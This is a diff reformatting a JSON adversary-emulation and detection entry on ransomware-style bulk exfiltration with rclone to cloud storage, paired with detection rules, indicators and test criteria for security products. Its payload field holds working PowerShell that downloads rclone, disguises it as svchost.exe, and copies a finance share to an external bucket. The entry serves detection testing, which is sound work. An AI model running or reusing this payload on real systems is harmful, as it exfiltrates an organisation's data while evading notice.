@@ -3,12 +3,15 @@
   "schema_version": "1.0.0",
   "entry_version": "1.0.0",
   "status": "active",
-
   "metadata": {
     "created_at": "2026-05-13T00:00:00Z",
     "updated_at": "2026-05-13T00:00:00Z",
     "authors": [
-      { "name": "Henry Reed", "email": "hreed@paloaltonetworks.com", "role": "author" }
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
     ],
     "tags": [
       "actor-ignoble-scorpius",
@@ -20,7 +23,12 @@
       "endpoint",
       "network"
     ],
-    "source_refs": ["SRC-UNIT42", "SRC-MITRE-ATTACK", "SRC-DFIR-REPORT", "SRC-RCLONE-DOCS"],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK",
+      "SRC-DFIR-REPORT",
+      "SRC-RCLONE-DOCS"
+    ],
     "pov_engine": {
       "engine_version_min": "0.1.0",
       "auto_load": true,
@@ -28,26 +36,29 @@
       "destructive": false,
       "requires_network_egress": true,
       "requires_internet": true,
-      "platforms": ["windows", "linux"],
+      "platforms": [
+        "windows",
+        "linux"
+      ],
       "estimated_runtime_seconds": 600,
       "cleanup_required": true,
       "safety_class": "destructive-with-cleanup"
     }
   },
-
   "identity": {
     "name": "Bulk Data Exfiltration via Rclone to Cloud Storage (T1567.002)",
-    "summary": "An attacker with file-server access uses rclone — a legitimate cloud-sync utility — to push hundreds of GB to attacker-controlled cloud storage (MEGA, B2, S3). The traffic blends with sanctioned cloud sync, defeats signature egress controls, and completes in under an hour on modern uplinks.",
+    "summary": "An attacker with file-server access uses rclone \u2014 a legitimate cloud-sync utility \u2014 to push hundreds of GB to attacker-controlled cloud storage (MEGA, B2, S3). The traffic blends with sanctioned cloud sync, defeats signature egress controls, and completes in under an hour on modern uplinks.",
     "description": "Rclone is the de facto exfiltration tool of the modern ransomware operator. Unit 42's BlackSuit Blitz reporting describes exfiltration of over 400 GB before encryption. The DFIR Report, Mandiant, and CrowdStrike have all documented rclone in Black Basta, BlackSuit, Akira, and Lockbit affiliate playbooks. Detection hinges on (a) the rclone binary itself (renamed often), (b) characteristic configuration patterns (`--multi-thread-streams`, `--transfers`, `--config`), and (c) sustained outbound throughput to non-corporate cloud endpoints. This TTP chains downstream of TTP-2026-0004 (DCSync provides the credentials to access file servers) and upstream of TTP-2026-0006 (post-exfil mass encryption).",
     "severity": "critical",
     "confidence": "high"
   },
-
   "threat_context": {
     "actors": [
       {
         "name": "Ignoble Scorpius",
-        "aliases": ["BlackSuit operators"],
+        "aliases": [
+          "BlackSuit operators"
+        ],
         "unit42_actor_id": "Ignoble Scorpius"
       },
       {
@@ -59,14 +70,19 @@
         "aliases": []
       }
     ],
-    "campaigns": ["BlackSuit Blitz 2025"],
-    "malware_families": [
-      { "name": "Rclone (legitimate tool, abused)" }
+    "campaigns": [
+      "BlackSuit Blitz 2025"
     ],
-    "industries_targeted": ["all"],
+    "malware_families": [
+      {
+        "name": "Rclone (legitimate tool, abused)"
+      }
+    ],
+    "industries_targeted": [
+      "technology"
+    ],
     "first_observed": "2020-06-01"
   },
-
   "mitre_attack": {
     "matrix": "enterprise",
     "techniques": [
@@ -74,22 +90,34 @@
         "technique_id": "T1567",
         "subtechnique_id": "T1567.002",
         "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
-        "tactic_ids": ["TA0010"],
-        "tactic_names": ["Exfiltration"]
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
       },
       {
         "technique_id": "T1048",
         "subtechnique_id": "T1048.003",
         "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
-        "tactic_ids": ["TA0010"],
-        "tactic_names": ["Exfiltration"]
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
       },
       {
         "technique_id": "T1074",
         "subtechnique_id": "T1074.001",
         "name": "Data Staged: Local Data Staging",
-        "tactic_ids": ["TA0009"],
-        "tactic_names": ["Collection"]
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
       }
     ],
     "kill_chain_phase": "actions-on-objectives",
@@ -101,7 +129,6 @@
       "Command: Command Execution"
     ]
   },
-
   "execution": {
     "target_platform": "windows",
     "execution_framework": "custom-cortex",
@@ -119,24 +146,68 @@
     ],
     "payload": {
       "interpreter": "powershell",
-      "code": "# Stage 1 — Drop rclone binary (often renamed by attackers). Lab uses canonical name.\n$rclone = \"C:\\Users\\Public\\Music\\svchost.exe\"  # masquerade pattern\nInvoke-WebRequest -Uri \"https://downloads.rclone.org/v1.66.0/rclone-v1.66.0-windows-amd64.zip\" -OutFile \"$env:TEMP\\r.zip\"\nExpand-Archive -Path \"$env:TEMP\\r.zip\" -DestinationPath \"$env:TEMP\\r\" -Force\nCopy-Item -Path (Get-ChildItem \"$env:TEMP\\r\" -Recurse -Filter rclone.exe).FullName -Destination $rclone -Force\n\n# Stage 2 — Write minimal config inline (avoids interactive setup).\n$cfg = @\"\n[${POV_REMOTE_NAME}]\ntype = ${POV_REMOTE_TYPE}\naccess_key_id = ${POV_REMOTE_KEY_ID}\nsecret_access_key = ${POV_REMOTE_KEY_SECRET}\nendpoint = ${POV_REMOTE_ENDPOINT}\nregion = ${POV_REMOTE_REGION}\n\"@\n$cfgPath = \"$env:TEMP\\rcfg.conf\"\nSet-Content -Path $cfgPath -Value $cfg -Encoding ASCII\n\n# Stage 3 — Sync 'sensitive' lab data to attacker remote with high concurrency.\n& $rclone copy \"C:\\lab-shares\\finance\" \"${POV_REMOTE_NAME}:${POV_REMOTE_BUCKET}/pov-${POV_RUN_ID}/\" `\n  --config $cfgPath `\n  --transfers 32 `\n  --multi-thread-streams 8 `\n  --checkers 16 `\n  --no-traverse `\n  --log-level INFO `\n  --stats 10s `\n  --use-mmap",
+      "code": "# Stage 1 \u2014 Drop rclone binary (often renamed by attackers). Lab uses canonical name.\n$rclone = \"C:\\Users\\Public\\Music\\svchost.exe\"  # masquerade pattern\nInvoke-WebRequest -Uri \"https://downloads.rclone.org/v1.66.0/rclone-v1.66.0-windows-amd64.zip\" -OutFile \"$env:TEMP\\r.zip\"\nExpand-Archive -Path \"$env:TEMP\\r.zip\" -DestinationPath \"$env:TEMP\\r\" -Force\nCopy-Item -Path (Get-ChildItem \"$env:TEMP\\r\" -Recurse -Filter rclone.exe).FullName -Destination $rclone -Force\n\n# Stage 2 \u2014 Write minimal config inline (avoids interactive setup).\n$cfg = @\"\n[${POV_REMOTE_NAME}]\ntype = ${POV_REMOTE_TYPE}\naccess_key_id = ${POV_REMOTE_KEY_ID}\nsecret_access_key = ${POV_REMOTE_KEY_SECRET}\nendpoint = ${POV_REMOTE_ENDPOINT}\nregion = ${POV_REMOTE_REGION}\n\"@\n$cfgPath = \"$env:TEMP\\rcfg.conf\"\nSet-Content -Path $cfgPath -Value $cfg -Encoding ASCII\n\n# Stage 3 \u2014 Sync 'sensitive' lab data to attacker remote with high concurrency.\n& $rclone copy \"C:\\lab-shares\\finance\" \"${POV_REMOTE_NAME}:${POV_REMOTE_BUCKET}/pov-${POV_RUN_ID}/\" `\n  --config $cfgPath `\n  --transfers 32 `\n  --multi-thread-streams 8 `\n  --checkers 16 `\n  --no-traverse `\n  --log-level INFO `\n  --stats 10s `\n  --use-mmap",
       "input_variables": [
-        { "name": "POV_REMOTE_NAME", "type": "string", "description": "Logical rclone remote alias." },
-        { "name": "POV_REMOTE_TYPE", "type": "string", "default": "s3", "description": "rclone backend type: s3, mega, b2, etc." },
-        { "name": "POV_REMOTE_ENDPOINT", "type": "string", "description": "S3-compatible endpoint URL for the lab bucket." },
-        { "name": "POV_REMOTE_REGION", "type": "string", "default": "us-east-1" },
-        { "name": "POV_REMOTE_KEY_ID", "type": "secret" },
-        { "name": "POV_REMOTE_KEY_SECRET", "type": "secret" },
-        { "name": "POV_REMOTE_BUCKET", "type": "string", "description": "Target bucket name." },
-        { "name": "POV_RUN_ID", "type": "string" }
+        {
+          "name": "POV_REMOTE_NAME",
+          "type": "string",
+          "description": "Logical rclone remote alias."
+        },
+        {
+          "name": "POV_REMOTE_TYPE",
+          "type": "string",
+          "default": "s3",
+          "description": "rclone backend type: s3, mega, b2, etc."
+        },
+        {
+          "name": "POV_REMOTE_ENDPOINT",
+          "type": "string",
+          "description": "S3-compatible endpoint URL for the lab bucket."
+        },
+        {
+          "name": "POV_REMOTE_REGION",
+          "type": "string",
+          "default": "us-east-1"
+        },
+        {
+          "name": "POV_REMOTE_KEY_ID",
+          "type": "secret"
+        },
+        {
+          "name": "POV_REMOTE_KEY_SECRET",
+          "type": "secret"
+        },
+        {
+          "name": "POV_REMOTE_BUCKET",
+          "type": "string",
+          "description": "Target bucket name."
+        },
+        {
+          "name": "POV_RUN_ID",
+          "type": "string"
+        }
       ],
       "timeout_seconds": 600
     },
     "expected_artifacts": [
-      { "artifact_type": "process", "description": "Process spawn with rclone command-line flags (even if binary is renamed).", "expected_value": "command_line CONTAINS_ANY ('--multi-thread-streams','--transfers','--no-traverse','--checkers') OR command_line MATCHES 'rclone.*\\\\bcopy\\\\b'" },
-      { "artifact_type": "file", "description": "rclone configuration file (often dropped to %TEMP% or user profile)." },
-      { "artifact_type": "network-connection", "description": "Sustained outbound HTTPS connections to a single destination ASN with high upload byte ratio.", "expected_value": "duration > 60s AND bytes_sent / bytes_received > 10 AND dst_asn NOT IN corp_allowlist" },
-      { "artifact_type": "dns-query", "description": "DNS resolution of known rclone-backend hostnames (e.g., *.mega.nz, *.backblazeb2.com, *.s3.amazonaws.com) from a host that has no business reason to use them." }
+      {
+        "artifact_type": "process",
+        "description": "Process spawn with rclone command-line flags (even if binary is renamed).",
+        "expected_value": "command_line CONTAINS_ANY ('--multi-thread-streams','--transfers','--no-traverse','--checkers') OR command_line MATCHES 'rclone.*\\\\bcopy\\\\b'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "rclone configuration file (often dropped to %TEMP% or user profile)."
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Sustained outbound HTTPS connections to a single destination ASN with high upload byte ratio.",
+        "expected_value": "duration > 60s AND bytes_sent / bytes_received > 10 AND dst_asn NOT IN corp_allowlist"
+      },
+      {
+        "artifact_type": "dns-query",
+        "description": "DNS resolution of known rclone-backend hostnames (e.g., *.mega.nz, *.backblazeb2.com, *.s3.amazonaws.com) from a host that has no business reason to use them."
+      }
     ],
     "cleanup": {
       "interpreter": "powershell",
@@ -147,18 +218,17 @@
       ]
     }
   },
-
   "detections": {
     "iocs": [
       {
         "ioc_type": "filename",
         "value": "rclone.exe",
-        "context": "Canonical binary name; attackers commonly rename — match on file hash and process behavior, not name alone."
+        "context": "Canonical binary name; attackers commonly rename \u2014 match on file hash and process behavior, not name alone."
       },
       {
         "ioc_type": "domain",
         "value": "*.mega.nz",
-        "context": "Common attacker-controlled destination; not malicious on its own — flag in combination with rclone behavior."
+        "context": "Common attacker-controlled destination; not malicious on its own \u2014 flag in combination with rclone behavior."
       }
     ],
     "biocs": [
@@ -167,21 +237,28 @@
         "description": "Any process executes with command-line containing rclone-specific flag combinations, regardless of binary name.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_command_line contains_all (\"--transfers\",\"--multi-thread-streams\"))\n      or (action_process_image_command_line contains \"--no-traverse\" and action_process_image_command_line contains \"copy\")\n      or (action_process_image_command_line matches \"rclone(\\\\.exe)?\\\\s+(copy|sync|move|lsd|ls)\")",
         "severity": "high",
-        "mitre_technique_ids": ["T1567.002"]
+        "mitre_technique_ids": [
+          "T1567.002"
+        ]
       },
       {
         "name": "Large Sustained Egress From File Server to Non-Corporate Cloud Provider",
         "description": "Single host sustains >100 Mbps outbound to a non-corporate destination ASN for >2 minutes, with byte-out / byte-in ratio > 10.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_FLOW\n| bin _time span=1m\n| comp sum(bytes_sent) as bs, sum(bytes_received) as br by src_host, dst_asn, _time\n| filter bs > 750000000 and (bs / (br + 1)) > 10\n| filter dst_asn not in corp_baseline.cloud_asns_allowlist",
         "severity": "critical",
-        "mitre_technique_ids": ["T1048.003", "T1567.002"]
+        "mitre_technique_ids": [
+          "T1048.003",
+          "T1567.002"
+        ]
       },
       {
         "name": "Outbound to Known Rclone-Backend Provider From Non-Sanctioned Host",
         "description": "DNS resolution + connection to MEGA / Backblaze B2 / pCloud / yandex disk endpoints from a host where these services are not sanctioned for business use.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_DNS\n| filter dns_query matches_any (\".*\\\\.mega\\\\.nz$\",\".*\\\\.mega\\\\.io$\",\".*\\\\.backblazeb2\\\\.com$\",\".*\\\\.pcloud\\\\.com$\",\".*\\\\.disk\\\\.yandex\\\\.net$\")\n| filter src_host not in corp_baseline.sanctioned_cloud_storage_users",
         "severity": "high",
-        "mitre_technique_ids": ["T1567.002"]
+        "mitre_technique_ids": [
+          "T1567.002"
+        ]
       }
     ],
     "xql_queries": [
@@ -206,52 +283,63 @@
     ],
     "correlation_rules": [
       {
-        "name": "Exfiltration — Rclone-Pattern Tool + Large Egress to Non-Corp ASN",
+        "name": "Exfiltration \u2014 Rclone-Pattern Tool + Large Egress to Non-Corp ASN",
         "rule_id": "CR-EXFIL-0001",
         "logic": "BIOC(Rclone Command-Line Flag Pattern) AND BIOC(Large Sustained Egress From File Server to Non-Corporate Cloud Provider) on same host within 30m"
       }
     ],
     "analytics_modules": [
       "Cortex XDR Data Exfiltration Detection",
-      "Advanced DNS Security — abnormal-destination domain category",
-      "NGFW App-ID — rclone signature (where available)"
+      "Advanced DNS Security \u2014 abnormal-destination domain category",
+      "NGFW App-ID \u2014 rclone signature (where available)"
     ]
   },
-
   "panw_mapping": {
     "products": [
       {
         "module": "cortex-xdr",
         "submodule": "behavioral-analytics",
         "coverage_tier": "detection",
-        "rule_ids": ["XDR-BIOC-EXFIL-RCLONE-001", "XDR-AN-EGRESS-VOLUME-001"],
+        "rule_ids": [
+          "XDR-BIOC-EXFIL-RCLONE-001",
+          "XDR-AN-EGRESS-VOLUME-001"
+        ],
         "agent_version_min": "8.4.0",
         "license_required": "pro"
       },
       {
         "module": "cortex-cdr",
         "coverage_tier": "detection",
-        "rule_ids": ["CDR-EXFIL-CLOUDSTORAGE-001"],
+        "rule_ids": [
+          "CDR-EXFIL-CLOUDSTORAGE-001"
+        ],
         "license_required": "advanced",
         "evidence_query": "preset:cloud_exfiltration | filter destination_service in ('MEGA','Backblaze','S3')"
       },
       {
         "module": "advanced-dns-security",
         "coverage_tier": "prevention",
-        "rule_ids": ["ADNS-CAT-STORAGE-UNAUTHORIZED"],
+        "rule_ids": [
+          "ADNS-CAT-STORAGE-UNAUTHORIZED"
+        ],
         "license_required": "advanced",
         "evidence_query": "DNS Security logs: category 'storage-services' blocked for non-sanctioned subnets."
       },
       {
         "module": "advanced-threat-prevention",
         "coverage_tier": "prevention",
-        "rule_ids": ["ATP-SIG-RCLONE-USERAGENT"],
+        "rule_ids": [
+          "ATP-SIG-RCLONE-USERAGENT"
+        ],
         "license_required": "advanced"
       },
       {
         "module": "ngfw-pa-series",
         "coverage_tier": "prevention",
-        "rule_ids": ["NGFW-AppID-rclone", "NGFW-DLP-Confidential-Egress"],
+        "rule_ids": [
+          "NGFW-AppID-rclone",
+          "NGFW-DLP-Confidential-Egress"
+        ],
         "license_required": "advanced",
         "evidence_query": "App-ID + DLP: rclone application identified or sensitive content match on outbound flow."
       },
@@ -259,21 +347,25 @@
         "module": "cortex-xsiam",
         "submodule": "analytics",
         "coverage_tier": "detection",
-        "rule_ids": ["XSIAM-AN-EXFIL-CORRELATION-001"],
+        "rule_ids": [
+          "XSIAM-AN-EXFIL-CORRELATION-001"
+        ],
         "license_required": "advanced"
       },
       {
         "module": "cortex-xsoar",
         "coverage_tier": "response",
-        "rule_ids": ["XSOAR-PB-ExfiltrationResponse-v2"],
+        "rule_ids": [
+          "XSOAR-PB-ExfiltrationResponse-v2"
+        ],
         "license_required": "base",
-        "evidence_query": "Playbook: Exfiltration Response — isolate host, block dst ASN at NGFW, snapshot file-server access logs, page DFIR."
+        "evidence_query": "Playbook: Exfiltration Response \u2014 isolate host, block dst ASN at NGFW, snapshot file-server access logs, page DFIR."
       }
     ],
     "use_cases": [
       {
         "use_case_id": "UC-EXFIL-001",
-        "name": "Double-Extortion Defense — Pre-Encryption Exfiltration Detection",
+        "name": "Double-Extortion Defense \u2014 Pre-Encryption Exfiltration Detection",
         "description": "Detect and disrupt large-volume cloud-storage exfiltration before encryption begins (the modern ransomware playbook stages exfil first).",
         "test_cases": [
           {
@@ -291,14 +383,16 @@
             "success_criteria": [
               "BIOC fires within 30s of process exec.",
               "Alert references both flag-pattern and binary masquerade.",
-              "XQL validation returns ≥1 row."
+              "XQL validation returns \u22651 row."
             ],
             "expected_score_weight": 0.3
           },
           {
             "test_case_id": "TC-EXFIL-001B",
             "objective": "NGFW + Advanced DNS Security block or alert on the egress before transfer completes.",
-            "preconditions": ["Lab firewall in path of exfil traffic; storage-services DNS category set to alert/block."],
+            "preconditions": [
+              "Lab firewall in path of exfil traffic; storage-services DNS category set to alert/block."
+            ],
             "success_criteria": [
               "NGFW App-ID identifies rclone OR DLP signature matches.",
               "Advanced DNS Security logs the destination resolution under `storage-services-unsanctioned`.",
@@ -311,7 +405,7 @@
             "objective": "XSIAM correlation rule fuses XDR + NGFW + DNS signals into one incident.",
             "success_criteria": [
               "Single incident with three contributing alerts.",
-              "Incident timeline shows process → DNS → flow in order.",
+              "Incident timeline shows process \u2192 DNS \u2192 flow in order.",
               "Correlation `CR-EXFIL-0001` named in the incident."
             ],
             "expected_score_weight": 0.2
@@ -330,13 +424,12 @@
       }
     ]
   },
-
   "remediation_guidance": {
     "preventive_controls": [
       "Application allow-listing on file servers and Tier 0/1 hosts; deny unsigned binaries.",
       "NGFW URL category `storage-services` set to alert/block for subnets that don't need access.",
       "DLP policies on egress for confidential content classifications.",
-      "Egress flow accounting — alert any host crossing N GB/hour outbound."
+      "Egress flow accounting \u2014 alert any host crossing N GB/hour outbound."
     ],
     "detection_engineering": [
       "Build a baseline of normal egress per host and per ASN; alert on top-1% anomalies.",
@@ -345,7 +438,6 @@
     ],
     "response_playbook": "XSOAR-PB-ExfiltrationResponse-v2"
   },
-
   "references": [
     {
       "title": "Anatomy of an Attack: The 'BlackSuit Blitz' at a Global Equipment Manufacturer",
@@ -355,7 +447,7 @@
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1567.002 — Exfiltration to Cloud Storage",
+      "title": "MITRE ATT&CK T1567.002 \u2014 Exfiltration to Cloud Storage",
       "url": "https://attack.mitre.org/techniques/T1567/002/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
@@ -367,14 +459,18 @@
       "publisher_id": "SRC-RCLONE-DOCS"
     },
     {
-      "title": "The DFIR Report — Rclone exfiltration case studies",
+      "title": "The DFIR Report \u2014 Rclone exfiltration case studies",
       "url": "https://thedfirreport.com/?s=rclone",
       "publisher": "The DFIR Report",
       "publisher_id": "SRC-DFIR-REPORT"
     }
   ],
-
   "changelog": [
-    { "entry_version": "1.0.0", "date": "2026-05-13", "author": "Henry Reed", "change": "Initial entry — BlackSuit Blitz decomposition." }
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-05-13",
+      "author": "Henry Reed",
+      "change": "Initial entry \u2014 BlackSuit Blitz decomposition."
+    }
   ]
 }
